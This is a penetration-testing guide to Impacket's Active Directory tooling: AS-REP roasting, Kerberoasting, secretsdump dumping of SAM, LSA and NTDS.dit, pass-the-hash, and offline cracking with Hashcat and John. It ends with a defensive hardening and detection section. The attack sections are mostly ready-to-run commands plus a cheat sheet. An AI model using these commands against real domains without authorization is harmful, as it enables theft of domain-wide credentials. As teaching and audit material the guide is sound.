# Impacket — Active Directory Credential Extraction & Kerberos Auditing Guide

A complete, production-grade guide to **Impacket**'s credential extraction and Active Directory attack toolchain, focusing on **`GetNPUsers`** (AS-REP Roasting), **`GetUserSPNs`** (Kerberoasting), and **`secretsdump`** (SAM/NTDS.dit dumping) with direct handoff to Hashcat and John the Ripper.

---

## 📑 Table of Contents

- [1. Overview & Impacket in Active Directory Penetration Testing](#1-overview-impacket-in-active-directory-penetration-testing)
  - [The Kerberos Exploitation Ecosystem](#the-kerberos-exploitation-ecosystem)
  - [AS-REP Roasting vs Kerberoasting Fundamentals](#as-rep-roasting-vs-kerberoasting-fundamentals)
- [2. Installation & Python Environment Setup](#2-installation-python-environment-setup)
  - [Installing Impacket via pipx / pip (macOS & Linux)](#installing-impacket-via-pipx-pip-macos-linux)
  - [Installing via Homebrew or APT](#installing-via-homebrew-or-apt)
  - [Verifying Installed Scripts (impacket-*)](#verifying-installed-scripts-impacket-)
- [3. AS-REP Roasting with GetNPUsers](#3-as-rep-roasting-with-getnpusers)
  - [Prerequisites & Target Discovery](#prerequisites-target-discovery)
  - [Extracting TGT Hashes Without Authentication](#extracting-tgt-hashes-without-authentication)
  - [Formatting Hashes for Hashcat (Mode 18200)](#formatting-hashes-for-hashcat-mode-18200)
- [4. Kerberoasting with GetUserSPNs](#4-kerberoasting-with-getuserspns)
  - [Discovering Service Principal Names (SPNs)](#discovering-service-principal-names-spns)
  - [Requesting TGS Tickets for Offline Cracking](#requesting-tgs-tickets-for-offline-cracking)
  - [Formatting Hashes for Hashcat (Mode 13100)](#formatting-hashes-for-hashcat-mode-13100)
- [5. Offline Hash Cracking Workflows](#5-offline-hash-cracking-workflows)
  - [Cracking AS-REP Hashes with Hashcat (18200)](#cracking-as-rep-hashes-with-hashcat-18200)
  - [Cracking Kerberoast TGS Hashes with Hashcat (13100)](#cracking-kerberoast-tgs-hashes-with-hashcat-13100)
  - [Cracking Kerberos Tickets in John the Ripper](#cracking-kerberos-tickets-in-john-the-ripper)
- [6. secretsdump: Dumping SAM, LSA & NTDS.dit](#6-secretsdump-dumping-sam-lsa-ntdsdit)
  - [Extracting Local Hashes from Workstations (SAM & LSA)](#extracting-local-hashes-from-workstations-sam-lsa)
  - [Dumping Domain-Wide Hashes via DRSUAPI (NTDS.dit)](#dumping-domain-wide-hashes-via-drsuapi-ntdsdit)
  - [Pass-the-Hash Integration](#pass-the-hash-integration)
- [7. Defensive Hardening & Active Directory Telemetry](#7-defensive-hardening-active-directory-telemetry)
  - [Enforcing Pre-Authentication & Strong AES Encryption](#enforcing-pre-authentication-strong-aes-encryption)
  - [Using Group Managed Service Accounts (gMSA)](#using-group-managed-service-accounts-gmsa)
  - [Monitoring Windows Event Logs (Event IDs 4768, 4769 & 4662)](#monitoring-windows-event-logs-event-ids-4768-4769-4662)
- [8. Quick Reference Cheat Sheet & FAQ](#8-quick-reference-cheat-sheet-faq)
  - [CLI Commands Summary Table](#cli-commands-summary-table)
  - [Troubleshooting & Common Pitfalls](#troubleshooting-common-pitfalls)

---

## 1. Overview & Impacket in Active Directory Penetration Testing

### The Kerberos Exploitation Ecosystem

**Impacket** is a collection of Python classes for working with network protocols, created by SecureAuth (now maintained by Fortra). In Windows enterprise security, Impacket is the foundational standard for auditing Active Directory, implementing low-level SMB, MSRPC, and Kerberos protocol interactions.

### AS-REP Roasting vs Kerberoasting Fundamentals

Both attacks leverage the core design of Kerberos to extract password hashes for offline cracking without triggering account lockouts:

1. **AS-REP Roasting (`GetNPUsers`)**:
   - Targets accounts where the administrative flag `DONT_REQ_PREAUTH` is set.
   - Requires **ZERO domain credentials**—anyone with network access to the Domain Controller (port 88) can request a Ticket-Granting Ticket (TGT).
   - The DC returns an encrypted `AS-REP` packet encrypted using the user's password hash.

2. **Kerberoasting (`GetUserSPNs`)**:
   - Targets service accounts assigned a **Service Principal Name (SPN)** (e.g. `MSSQLSvc/db01.corp.local:1433`).
   - Requires **any valid low-privileged domain user credential**.
   - Requests a Ticket-Granting Service (TGS) ticket from the DC.
   - The TGS ticket is encrypted with the service account's NTLM/password hash, which can be extracted and cracked offline.

```
┌─────────────────────────────────────────────────────────────┐
│                 Kerberos Attack Comparison                  │
├──────────────────────────────┬──────────────────────────────┤
│    AS-REP Roasting           │         Kerberoasting        │
├──────────────────────────────┼──────────────────────────────┤
│ • Tool: GetNPUsers.py        │ • Tool: GetUserSPNs.py       │
│ • Domain Creds: NOT required │ • Domain Creds: Required     │
│ • Target: DONT_REQ_PREAUTH   │ • Target: Accounts with SPNs │
│ • Packet: AS-REP Response    │ • Packet: TGS-REP Ticket     │
│ • Hashcat Mode: 18200        │ • Hashcat Mode: 13100        │
└──────────────────────────────┴──────────────────────────────┘
```

---

## 2. Installation & Python Environment Setup

### Installing Impacket via pipx / pip (macOS & Linux)

The recommended approach on modern systems is using `pipx` to isolate dependencies:

```bash
# Install pipx if needed
brew install pipx
pipx ensurepath

# Install Impacket globally via pipx
pipx install impacket

# Verify toolchain availability
which impacket-GetNPUsers
impacket-GetNPUsers -h
```

### Installing via Homebrew or APT

```bash
# macOS via Homebrew
brew install impacket

# Kali / Debian / Ubuntu
sudo apt-get update
sudo apt-get install -y python3-impacket impacket-scripts
```

### Verifying Installed Scripts (impacket-*)

Depending on your distribution, tools are invoked as `impacket-GetNPUsers` or `GetNPUsers.py`:

```bash
impacket-GetNPUsers -h
impacket-GetUserSPNs -h
impacket-secretsdump -h
```

---

## 3. AS-REP Roasting with GetNPUsers

### Prerequisites & Target Discovery

You only need:
- An IP address or hostname of the Domain Controller.
- The Fully Qualified Domain Name (e.g. `corp.local`).
- A list of domain usernames (which can be obtained using `kerbrute userenum`).

### Extracting TGT Hashes Without Authentication

```bash
# Query DC for users without pre-authentication and output Hashcat-compatible hashes
impacket-GetNPUsers \
  -dc-ip 192.168.1.10 \
  -no-pass \
  -usersfile domain_users.txt \
  -format hashcat \
  -outputfile asrep_hashes.txt \
  corp.local/
```

Parameters:
- `-dc-ip`: IP of the Domain Controller.
- `-no-pass`: Do not prompt for a password (anonymous/unauthenticated request).
- `-usersfile`: Text file with candidate domain usernames.
- `-format hashcat`: Formats hash directly for Hashcat mode `18200`.
- `-outputfile`: File where captured ticket hashes will be written.

### Formatting Hashes for Hashcat (Mode 18200)

Captured AS-REP hashes start with `$krb5asrep$23$`:

```text
$krb5asrep$23$backup_admin@CORP.LOCAL:3a2b1c...$7d8e9f...
```

---

## 4. Kerberoasting with GetUserSPNs

### Discovering Service Principal Names (SPNs)

To list all accounts in the domain associated with SPNs without requesting tickets:

```bash
# Authenticate with any domain user to enumerate SPNs
impacket-GetUserSPNs \
  -dc-ip 192.168.1.10 \
  corp.local/jdoe:Summer2024!
```

Output displays:
- Service Name (e.g. `MSSQLSvc/sql01.corp.local`)
- Account Name (e.g. `svc_sql`)
- MemberOf (e.g. `Domain Admins`)

### Requesting TGS Tickets for Offline Cracking

Add the `-request` flag to pull and save the encrypted Kerberos tickets:

```bash
# Request and save TGS tickets for all SPN accounts
impacket-GetUserSPNs \
  -dc-ip 192.168.1.10 \
  -request \
  -outputfile kerberoast_hashes.txt \
  corp.local/jdoe:Summer2024!
```

### Formatting Hashes for Hashcat (Mode 13100)

Captured Kerberoast hashes begin with `$krb5tgs$23$*`:

```text
$krb5tgs$23$*svc_sql*CORP.LOCAL*corp.local/svc_sql*$6a7b8c...
```

---

## 5. Offline Hash Cracking Workflows

### Cracking AS-REP Hashes with Hashcat (18200)

```bash
# GPU dictionary attack against AS-REP hashes
hashcat -m 18200 -a 0 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r /opt/homebrew/share/hashcat/rules/best64.rule
```

### Cracking Kerberoast TGS Hashes with Hashcat (13100)

```bash
# GPU dictionary attack against Kerberoast TGS hashes
hashcat -m 13100 -a 0 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r /opt/homebrew/share/hashcat/rules/best64.rule
```

### Cracking Kerberos Tickets in John the Ripper

John the Ripper Jumbo automatically detects Kerberos formats:

```bash
# John cracks both AS-REP ($krb5asrep$) and TGS ($krb5tgs$)
john --wordlist=rockyou.txt --rules=Jumbo asrep_hashes.txt
john --wordlist=rockyou.txt --rules=Jumbo kerberoast_hashes.txt
```

---

## 6. secretsdump: Dumping SAM, LSA & NTDS.dit

Once an auditor acquires administrative privileges, **`secretsdump`** extracts all password hashes from the host.

### Extracting Local Hashes from Workstations (SAM & LSA)

Extract local Windows account passwords and LSA cached secrets from a remote workstation:

```bash
# Dump local SAM and SYSTEM hashes using local Administrator credentials
impacket-secretsdump \
  Administrator:'SecurePass123!'@192.168.1.50
```

Output includes:
- Local Administrator NTLM hashes.
- LSA Secrets (plaintext passwords stored by services, scheduled tasks, or auto-logins).
- DPAPI backup keys.

### Dumping Domain-Wide Hashes via DRSUAPI (NTDS.dit)

With Domain Admin credentials, replicate and dump all password hashes in the entire Active Directory domain using the official DRSUAPI protocol (VSS shadow copy alternative):

```bash
# Dump entire Active Directory NTDS.dit database over the network
impacket-secretsdump \
  -just-dc-ntlm \
  -outputfile domain_ntds_dump \
  corp.local/da_user:'AdminPassword!'@192.168.1.10
```

Flags:
- `-just-dc-ntlm`: Extracts NTLM hashes without Kerberos keys.
- `-outputfile`: Saves output to `.ntds` text files.

Cracking the resulting NTLM hashes in Hashcat:

```bash
# NTLM is Hashcat Mode 1000 (Cracks at tens of billions of guesses per second on modern GPUs)
hashcat -m 1000 -a 0 domain_ntds_dump.ntds /usr/share/wordlists/rockyou.txt
```

### Pass-the-Hash Integration

Impacket tools natively support **Pass-the-Hash (PtH)**, allowing you to authenticate using the NTLM hash directly without recovering the plaintext password:

```bash
# Authenticate using NTLM hash (LM:NTLM)
impacket-secretsdump \
  -hashes aad3b435b51404eeaad3b435b51404ee:32ed87b78f537c1b1fae53222016f4e0 \
  Administrator@192.168.1.50
```

---

## 7. Defensive Hardening & Active Directory Telemetry

### Enforcing Pre-Authentication & Strong AES Encryption

1. **Disable `DONT_REQ_PREAUTH`**: Audit all user accounts and ensure pre-authentication is enforced across the domain.
2. **Switch SPNs to AES-256 Kerberos Encryption**: By default, Kerberoasting targets RC4 encryption (`$krb5tgs$23$`), which is fast to crack. Configure service accounts to support `AES256_HMAC_SHA1` encryption (`$krb5tgs$18$`), significantly reducing offline cracking viability.

### Using Group Managed Service Accounts (gMSA)

Migrate service accounts to **Group Managed Service Accounts (gMSA)**:
- Active Directory automatically generates and rotates complex 128-character random passwords every 30 days.
- Even if a TGS ticket is intercepted, 128-character random keys cannot be cracked via dictionary attacks.

### Monitoring Windows Event Logs (Event IDs 4768, 4769 & 4662)

Configure SIEM rules to alert on:
- **Event ID 4768**: Ticket-Granting Ticket requested with pre-auth type `0` (None).
- **Event ID 4769**: Ticket-Granting Service requested with Ticket Encryption Type `0x17` (RC4). A single user requesting multiple RC4 tickets in seconds is a hallmark of Kerberoasting.
- **Event ID 4662**: Directory Service access looking for `Replicating Directory Changes` (DRSUAPI dump).

---

## 8. Quick Reference Cheat Sheet & FAQ

### CLI Commands Summary Table

| Action | Command Syntax |
| :--- | :--- |
| **AS-REP Roasting** | `impacket-GetNPUsers -dc-ip IP -no-pass -usersfile users.txt -format hashcat DOMAIN/` |
| **Enumerate SPNs** | `impacket-GetUserSPNs -dc-ip IP DOMAIN/user:password` |
| **Kerberoast (Request TGS)**| `impacket-GetUserSPNs -dc-ip IP -request -outputfile tgs.txt DOMAIN/user:password` |
| **Dump Local SAM** | `impacket-secretsdump user:password@TARGET_IP` |
| **Dump Domain NTDS.dit** | `impacket-secretsdump -just-dc-ntlm DOMAIN/admin:password@DC_IP` |
| **Pass-the-Hash Execution** | `impacket-secretsdump -hashes LM:NTLM user@TARGET_IP` |
| **Crack AS-REP (Hashcat)** | `hashcat -m 18200 asrep.hash wordlist.txt` |
| **Crack Kerberoast (Hashcat)**| `hashcat -m 13100 tgs.hash wordlist.txt` |
| **Crack NTLM (Hashcat)** | `hashcat -m 1000 ntds.hash wordlist.txt` |

### Troubleshooting & Common Pitfalls

> [!NOTE]
> **Kerberos Clock Skew**: If you receive `KRB_AP_ERR_SKEW(Clock skew too great)`, synchronize your local system clock with the Domain Controller before requesting tickets.

> [!TIP]
> **No SPNs Found**: If `GetUserSPNs` finds no targets, the domain may not have service accounts configured with SPNs.

> [!IMPORTANT]
> **Authorizations**: `secretsdump` directly replicates domain password databases. Use only during sanctioned penetration testing engagements with explicit rules of engagement.
